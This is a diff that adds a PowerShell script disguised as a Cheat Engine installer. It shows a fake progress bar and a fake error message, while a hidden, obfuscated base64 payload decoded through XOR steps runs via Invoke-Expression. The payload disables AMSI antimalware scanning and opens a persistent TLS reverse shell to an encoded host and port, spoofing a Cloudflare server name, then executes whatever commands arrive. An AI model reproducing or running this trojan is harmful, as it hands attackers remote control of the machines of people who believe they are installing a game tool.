@@ -1,0 +1,82 @@
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "Cheat Engine"
+$form.Size = New-Object System.Drawing.Size(400,150)
+$form.StartPosition = "CenterScreen"
+$form.FormBorderStyle = 'FixedDialog'
+$form.MaximizeBox = $false
+$form.MinimizeBox = $false
+
+$label = New-Object System.Windows.Forms.Label
+$label.Text = "Preparing Cheat Engine..."
+$label.AutoSize = $false
+$label.TextAlign = 'MiddleCenter'
+$label.Dock = 'Top'
+$label.Height = 30
+$form.Controls.Add($label)
+
+$progressBar = New-Object System.Windows.Forms.ProgressBar
+$progressBar.Minimum = 0
+$progressBar.Maximum = 100
+$progressBar.Value = 0
+$progressBar.Dock = 'Bottom'
+$progressBar.Height = 30
+$form.Controls.Add($progressBar)
+
+$form.Show()
+
+for ($i = 0; $i -le 100; $i++) {
+    $progressBar.Value = $i
+    $label.Text = "Preparing Cheat Engine... $i%"
+    
+    # Fenster "leben lassen"
+    [System.Windows.Forms.Application]::DoEvents()
+    
+    Start-Sleep -Milliseconds 300
+}
+
+[System.Windows.Forms.MessageBox]::Show("Error: Failed to prepare Cheat Engine.","Error","OK","Error")
+
+$form.Close()
+
+
+
+function R1 { Get-Random -Minimum 1 -Maximum 101 }
+function R2 {
+    param([byte[]]$x, [byte[]]$y)
+    $z = New-Object byte[] $x.Length
+    for ($i = 0; $i -lt $x.Length; $i++) {
+        $z[$i] = $x[$i] -bxor $y[$i % $y.Length]
+    }
+    return $z
+}
+$zutat = "JGRhdGVpTmFtZSA9ICJXdXJzdC5leGUiDQokZGF0ZWlQZmFkID0gSm9pbi1QYXRoIChHZXQtTG9jYXRpb24pICRkYXRlaU5hbWUNCmlmIChUZXN0LVBhdGggJGRhdGVpUGZhZCkgew0KICAgIFJlbW92ZS1JdGVtICRkYXRlaVBmYWQgLUZvcmNlDQp9DQoNCiRQNllSSzhFdDA5UUlLPSRudWxsOyRramY9W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCg5MDc2Kzg2MzEtODYzMSkpOyRhbXJ6d3FscW9ldWJrbnBtbXd6cGQ9IitbQ2hhUl0oMTE5KjEwMC8xMDApK1tjSEFyXShbQnlURV0weDY4KStbY0hBUl0oW0J5VEVdMHg2MykrW0NoYVJdKFtCWXRFXTB4NzApK1tDaGFyXShbQll0RV0weDcxKStbY2hhcl0oMTE3KStbQ2hhcl0oW2JZdEVdMHg3NSkiO1tUaHJlYWRpbmcuVGhyZWFkXTo6U2xlZXAoMjU2KTtbUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCJTeXN0ZW0uJChbQ2hhUl0oNzcrMi0yKStbY2hBcl0oOTcpK1tjSGFyXSgxMTApK1tjSEFSXShbQnl0ZV0weDYxKStbY0hhUl0oMTAzKStbQ0hBcl0oMTAxKzc4LTc4KStbQ0hBUl0oMTA5Kjc5Lzc5KStbQ2hhcl0oMTAxKjgvOCkrW0NoYXJdKFtiWVRlXTB4NmUpK1tjaGFSXSgxMTYpKS4kKFtjaEFyXShbQllURV0weDQxKStbY2hBcl0oMjArOTcpK1tjSGFyXSgxMTYqMTkvMTkpK1tjSEFSXShbYllURV0weDZmKStbQ0hhUl0oW2JZdGVdMHg2ZCkrW0NIQXJdKDk3KjYzLzYzKStbQ2hhcl0oMTE2KjUyLzUyKStbQ2hBcl0oMTA1KStbQ2hBUl0oMTExKzIxLTIxKStbY2hhUl0oW2J5VEVdMHg2ZSkpLiQoKCfDhG1zJysnw67DmXQnKyfDrmxzJykubk9SbUFsaVplKFtDaEFSXShbYnl0ZV0weDQ2KStbY0hBcl0oW0JZVEVdMHg2ZikrW0NoQXJdKDExNCoyMi8yMikrW2NIYXJdKDEwOSkrW2NoYVJdKFtCWXRFXTB4NDQpKSAtcmVwbGFjZSBbQ2hhUl0oOTIrNjMtNjMpK1tDSEFSXSgxMDUrNykrW2NoYVJdKDEyMysyNy0yNykrW2NIYXJdKDc3KzU2LTU2KStbY0hhcl0oW2J5VGVdMHg2ZSkrW2NIYVJdKFtiWXRlXTB4N2QpKSIpLkdldEZpZWxkKCIkKCgnw6Btc8OuU8OpcycrJ3PDrMO0bicpLm5Pcm1BbElaZShbY2hhUl0oW0JZVGVdMHg0NikrW0NoQVJdKDExMSs2LTYpK1tjSEFyXSg4NysyNykrW2NoYVJdKFtieVRFXTB4NmQpK1tjSEFyXSgyNys0MSkpIC1yZXBsYWNlIFtDSEFyXSgyNCs2OCkrW0NIQVJdKFtCeVRFXTB4NzApK1tDaEFyXShbYnl0ZV0weDdiKStbQ2hBUl0oNzcrNTEtNTEpK1tjSGFSXSgxMTArNDAtNDApK1tDSGFyXSgxMjUrMTE5LTExOSkpIiwgIk5vblB1YmxpYyxTdGF0aWMiKS5TZXRWYWx1ZSgkUDZZUks4RXQwOVFJSywgJFA2WVJLOEV0MDlRSUspO1tSZWZdLkFzc2VtYmx5LkdldFR5cGUoIlN5c3RlbS4kKFtDaGFSXSg3NysyLTIpK1tjaEFyXSg5NykrW2NIYXJdKDExMCkrW2NIQVJdKFtCeXRlXTB4NjEpK1tjSGFSXSgxMDMpK1tDSEFyXSgxMDErNzgtNzgpK1tDSEFSXSgxMDkqNzkvNzkpK1tDaGFyXSgxMDEqOC84KStbQ2hhcl0oW2JZVGVdMHg2ZSkrW2NoYVJdKDExNikpLiQoW2NoQXJdKFtCWVRFXTB4NDEpK1tjaEFyXSgyMCs5NykrW2NIYXJdKDExNioxOS8xOSkrW2NIQVJdKFtiWVRFXTB4NmYpK1tDSGFSXShbYll0ZV0weDZkKStbQ0hBcl0oOTcqNjMvNjMpK1tDaGFyXSgxMTYqNTIvNTIpK1tDaEFyXSgxMDUpK1tDaEFSXSgxMTErMjEtMjEpK1tjaGFSXShbYnlURV0weDZlKSkuJCgoJ8OEbXMnKyfDrsOZdCcrJ8OubHMnKS5uT1JtQWxpWmUoW0NoQVJdKFtieXRlXTB4NDYpK1tjSEFyXShbQllURV0weDZmKStbQ2hBcl0oMTE0KjIyLzIyKStbY0hhcl0oMTA5KStbY2hhUl0oW0JZdEVdMHg0NCkpIC1yZXBsYWNlIFtDaGFSXSg5Mis2My02MykrW0NIQVJdKDEwNSs3KStbY2hhUl0oMTIzKzI3LTI3KStbY0hhcl0oNzcrNTYtNTYpK1tjSGFyXShbYnlUZV0weDZlKStbY0hhUl0oW2JZdGVdMHg3ZCkpIikuR2V0RmllbGQoIiQoW2NoQVJdKDk3KzYyLTYyKStbY0hBcl0oMTA5KzgzLTgzKStbQ2hhUl0oW2JZdGVdMHg3MykrW2NIYXJdKDEwNSo3MC83MCkrW2NIQVJdKFtieVRFXTB4NDMpK1tjSEFyXSgxMTEpK1tjSGFSXSgxMTArMzItMzIpK1tDaEFyXSgxMTYpK1tDSEFyXShbYnlURV0weDY1KStbQ2hhcl0oW0JZVEVdMHg3OCkrW0NIYVJdKDExNis5MS05MSkpIiwgIk5vblB1YmxpYyxTdGF0aWMiKS5TZXRWYWx1ZSgkUDZZUks4RXQwOVFJSywgW0ludFB0cl0ka2pmKTskaXlqeHR6cGx4aG13cmp2YXE9IisoJ3dqenpww7Riw6Nyw6zDpHYnKyd0w6QnKS5uT1JtQWxJemUoW2NIYXJdKFtCWXRFXTB4NDYpK1tDaGFyXShbYnlURV0weDZmKStbY2hBUl0oMTE0KzkwLTkwKStbY2hBUl0oW0JZVEVdMHg2ZCkrW0NoQXJdKDY4KzQxLTQxKSkgLXJlcGxhY2UgW0NoQVJdKFtCWVRFXTB4NWMpK1tDSGFyXShbYll0RV0weDcwKStbY2hhUl0oW2J5VGVdMHg3YikrW0NIQXJdKFtCWXRFXTB4NGQpK1tjSGFyXShbQnl0ZV0weDZlKStbY0hhcl0oMTI1KzQzLTQzKSI7W1RocmVhZGluZy5UaHJlYWRdOjpTbGVlcCgzMikNCmZ1bmN0aW9uIERlY29kZS1CYXNlNjRTdHJpbmcoJGIpe1tUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRiKSl9DQokV2pmSXdKNDIwNDIwNjk2OT1EZWNvZGUtQmFzZTY0U3RyaW5nICJNVGt5TGpFMk9DNHhOemd1TWpNPSINCiRXdXJzdFNhbmR3aWNoNDIwPVtpbnRdKERlY29kZS1CYXNlNjRTdHJpbmcgIk9EQTRNQT09IikNCiRzc2xQcm90bz1bU3lzdGVtLlNlY3VyaXR5LkF1dGhlbnRpY2F0aW9uLlNzbFByb3RvY29sc106OlRsczEyDQoNCmZ1bmN0aW9uIFdyaXRlLVN0cmVhbSgkc3csJHR4dCl7JHN3LldyaXRlKCR0eHQgKyAnU0hFTEw+ICcpOyRzdy5GbHVzaCgpfQ0KDQp3aGlsZSgkdHJ1ZSl7DQogICAgdHJ5ew0KICAgICAgICAkY2xpPU5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50DQogICAgICAgICRjbGkuQ29ubmVjdCgkV2pmSXdKNDIwNDIwNjk2OSwkV3Vyc3RTYW5kd2ljaDQyMCkNCiAgICAgICAgJG5ldFN0cmVhbT0kY2xpLkdldFN0cmVhbSgpDQogICAgICAgICRzc2w9TmV3LU9iamVjdCBOZXQuU2VjdXJpdHkuU3NsU3RyZWFtKCRuZXRTdHJlYW0sJGZhbHNlLCh7JHRydWV9IC1hcyBbTmV0LlNlY3VyaXR5LlJlbW90ZUNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrXSkpDQogICAgICAgICRzc2wuQXV0aGVudGljYXRlQXNDbGllbnQoJ2Nsb3VkZmxhcmUtZG5zLmNvbScsJG51bGwsJHNzbFByb3RvLCRmYWxzZSkNCiAgICAgICAgaWYoLW5vdCAoJHNzbC5Jc0VuY3J5cHRlZCAtYW5kICRzc2wuSXNTaWduZWQpKXsgJHNzbC5DbG9zZSgpOyRjbGkuQ2xvc2UoKTtTdGFydC1TbGVlcCA1O2NvbnRpbnVlIH0NCg0KICAgICAgICAkc3c9TmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJHNzbCkNCiAgICAgICAgJHN3LkF1dG9GbHVzaD0kdHJ1ZQ0KICAgICAgICBXcml0ZS1TdHJlYW0gJHN3ICcnDQoNCiAgICAgICAgJGJ1Zj1OZXctT2JqZWN0IEJ5dGVbXSA0MDk2DQogICAgICAgIHdoaWxlKCR0cnVlKXsNCiAgICAgICAgICAgIHRyeXsNCiAgICAgICAgICAgICAgICAkcj0kc3NsLlJlYWQoJGJ1ZiwwLCRidWYuTGVuZ3RoKQ0KICAgICAgICAgICAgICAgIGlmKCRyIC1sZSAwKXt0aHJvdyAieCJ9DQogICAgICAgICAgICAgICAgJGNtZD0oW1RleHQuRW5jb2RpbmddOjpVVEY4KS5HZXRTdHJpbmcoJGJ1ZiwwLCRyKS5UcmltKCkNCiAgICAgICAgICAgICAgICBpZihbc3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkY21kKSl7V3JpdGUtU3RyZWFtICRzdyAnJztjb250aW51ZX0NCg0KICAgICAgICAgICAgICAgICMgU2NodXR6IHZvciBkaXJla3RlbSBJRVggbWl0IHdoaXRlbGlzdCAoa2VpbiBhdXRvbWF0aXNjaGVzIEF1c2bDvGhyZW4pDQogICAgICAgICAgICAgICAgaWYoJGNtZCAtbWF0Y2ggJ15ccyppZXhccysnKXsNCiAgICAgICAgICAgICAgICAgICAgJG91dD0iSW52b2tlLUV4cHJlc3Npb24gaXN0IGRlYWt0aXZpZXJ0LiINCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICB0cnl7JG91dD1JbnZva2UtRXhwcmVzc2lvbiAkY21kIDI+JjEgfCBPdXQtU3RyaW5nfWNhdGNoeyRvdXQ9JF8uRXhjZXB0aW9uLk1lc3NhZ2V9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIFdyaXRlLVN0cmVhbSAkc3cgJG91dA0KICAgICAgICAgICAgfWNhdGNoe2JyZWFrfQ0KICAgICAgICB9DQoNCiAgICAgICAgJHN3LkNsb3NlKCkNCiAgICAgICAgJHNzbC5DbG9zZSgpDQogICAgICAgICRuZXRTdHJlYW0uQ2xvc2UoKQ0KICAgICAgICAkY2xpLkNsb3NlKCkNCiAgICB9Y2F0Y2h7fQ0KICAgIFN0YXJ0LVNsZWVwIDUNCn0NCg=="
+
+$s1 = $zutat.Substring(0, 4)
+$s2 = $zutat.Substring(4, 5)
+$s3 = $zutat.Substring(9, 4)
+$s4 = $zutat.Substring(13, 6)
+$s5 = $zutat.Substring(19, 3)
+$s6 = $zutat.Substring(22, 5)
+$s7 = $zutat.Substring(27)
+
+$gekocht = $s1 + $s2 + $s3 + $s4 + $s5 + $s6 + $s7
+
+$b = [Text.Encoding]::UTF8.GetBytes($gekocht)
+$c = [string][math]::Round([math]::Pow((R1),10))
+$d = [Text.Encoding]::UTF8.GetBytes($c)
+$e = $d[($d.Length-1)..0]
+
+$f1 = R2 -x $b -y $d
+$f2 = R2 -x $f1 -y $e
+$g = [Text.Encoding]::UTF8.GetString($f2)
+
+$h = R2 -x ([Text.Encoding]::UTF8.GetBytes($g)) -y $e
+$i = R2 -x $h -y $d
+$j = [Text.Encoding]::UTF8.GetString($i)
+$k = [Convert]::FromBase64String($j)
+$l = [Text.Encoding]::UTF8.GetString($k)
+
+Invoke-Expression $l
